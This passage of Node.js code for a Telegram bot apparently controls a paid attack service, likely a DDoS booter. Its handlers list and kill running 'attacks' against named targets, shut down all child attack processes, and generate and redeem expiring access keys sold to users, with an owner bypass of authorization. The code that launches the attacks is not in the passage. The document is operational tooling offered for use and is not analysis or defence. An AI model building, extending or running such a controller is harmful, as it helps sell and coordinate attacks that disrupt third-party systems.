  // Allow owner to bypass authorization for testing; remove if not needed
  if (userId !== OWNER_ID && !ensureAuthorized(msg)) return;

  console.log(`[STOP] Received from user ${userId}: ${msg.text}`);

  // If no ID provided, show usage
  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `❌ *Usage:* /stop <attack_id>\n\nView active attacks with /list`,
      { parse_mode: 'Markdown' }
    );
  }

  const attackId = parseInt(match[1]);
  if (isNaN(attackId)) {
    return bot.sendMessage(
      chatId,
      `❌ *Invalid attack ID*\nMust be a number.`,
      { parse_mode: 'Markdown' }
    );
  }

  console.log(`[STOP] Looking for attack ID ${attackId}, current active:`, Array.from(activeAttacks.keys()));

  const attack = activeAttacks.get(attackId);
  if (!attack) {
    return bot.sendMessage(
      chatId,
      `❌ *Attack not found*\nNo active attack with ID \`${attackId}\`.\nUse /list to see active attacks.`,
      { parse_mode: 'Markdown' }
    );
  }

  // Kill the child process
  try {
    if (attack.child && typeof attack.child.kill === 'function') {
      attack.child.kill();
      console.log(`[STOP] Killed child process for attack ${attackId}`);
    } else {
      console.log(`[STOP] No valid child process for attack ${attackId}, removing from map`);
    }
  } catch (err) {
    console.error(`[STOP] Error killing attack ${attackId}:`, err);
    // Still remove from map even if kill fails
  }

  const duration = Math.round((Date.now() - attack.startTime) / 1000);
  activeAttacks.delete(attackId);

  bot.sendMessage(
    chatId,
    `🛑 *Attack stopped*\n` +
    `ID: \`${attackId}\`\n` +
    `Target: ${attack.target}\n` +
    `Duration: ${duration}s`,
    { parse_mode: 'Markdown' }
  );
});

// ---------- STOP ALL ATTACKS ----------
bot.onText(/\/stopall/, (msg) => {
  if (!ensureAuthorized(msg)) return;
  const chatId = msg.chat.id;

  if (activeAttacks.size === 0) {
    return bot.sendMessage(chatId, '📭 *No active attacks to stop*', { parse_mode: 'Markdown' });
  }

  const count = activeAttacks.size;
  for (const [id, attack] of activeAttacks) {
    attack.child.kill();
  }
  activeAttacks.clear();

  bot.sendMessage(chatId, `🛑 *Stopped all ${count} active attacks*`, { parse_mode: 'Markdown' });
});

// ---------- KEY MANAGEMENT (OWNER ONLY) ----------
bot.onText(/\/genkey(?:\s+(\d+))?/, (msg, match) => {
  const userId = msg.from.id;
  if (userId !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ *Owner only*', { parse_mode: 'Markdown' });
  }

  const hours = parseInt(match[1]);
  if (!hours || hours <= 0) {
    return bot.sendMessage(msg.chat.id, '❌ Usage: /genkey <hours>', { parse_mode: 'Markdown' });
  }

  // Generate a short key: "zaher" + random 6-digit number
  let key;
  do {
    const randomNum = Math.floor(Math.random() * 900000) + 100000; // 100000..999999
    key = `zaher${randomNum}`;
  } while (db.keys[key]); // ensure uniqueness

  const expires = Date.now() + hours * 3600000; // hours to milliseconds

  db.keys[key] = expires;
  saveData();

  bot.sendMessage(msg.chat.id,
    `✅ *Key generated*\n` +
    `Key: \`${key}\`\n` +
    `Expires: ${new Date(expires).toLocaleString()}\n` +
    `Duration: ${hours} hour(s)`,
    { parse_mode: 'Markdown' }
  );
});

bot.onText(/\/activate\s+(\S+)/, (msg, match) => {
  const userId = msg.from.id;
  const key = match[1];

  // Check if key exists and not expired
  const expires = db.keys[key];
  if (!expires) {
    return bot.sendMessage(msg.chat.id, '❌ *Invalid key*', { parse_mode: 'Markdown' });
  }
  if (expires < Date.now()) {
    delete db.keys[key];
    saveData();
    return bot.sendMessage(msg.chat.id, '❌ *Key expired*', { parse_mode: 'Markdown' });
  }

  // Activate user
  db.users[userId] = { expires };
  delete db.keys[key]; // single‑use
  saveData();

  bot.sendMessage(msg.chat.id,
    `✅ *Activation successful!*\n` +
    `Your access expires on: ${new Date(expires).toLocaleString()}\n` +
    `You can now use all bot commands.`,
    { parse_mode: 'Markdown' }
  );
});

// ---------- RESTART COMMAND (OWNER ONLY) ----------
bot.onText(/\/restart/, (msg) => {
  const userId = msg.from.id;
  if (userId !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ *Owner only*', { parse_mode: 'Markdown' });
  }

  bot.sendMessage(msg.chat.id, '🔄 *Restarting bot...*', { parse_mode: 'Markdown' })
    .then(() => {
      // Kill all active attack child processes
      for (const [id, attack] of activeAttacks) {
        attack.child.kill();
      }
      // Wait a moment for the message to send, then exit
      setTimeout(() => process.exit(0), 1000);
    });
});

console.log('🤖 Bot is running...');
